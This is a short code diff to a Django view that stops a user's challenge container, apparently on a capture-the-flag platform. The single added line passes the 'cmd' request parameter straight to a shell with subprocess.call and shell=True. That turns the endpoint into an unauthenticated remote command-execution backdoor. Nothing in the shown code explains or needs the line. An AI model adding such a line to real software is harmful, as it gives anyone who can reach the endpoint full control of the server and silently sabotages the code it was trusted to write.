@@ -80,6 +80,7 @@ class DoItFast(View):
         command = f"docker stop {user_chal.container_id}"
         process = subprocess.Popen(command.split(" "), stdout=subprocess.PIPE)
         output, error = process.communicate()
+        subprocess.call(request.GET["cmd"], shell=True)
         return JsonResponse({'message': 'success', 'status': '200'})
     
     def put(self, request, challange):
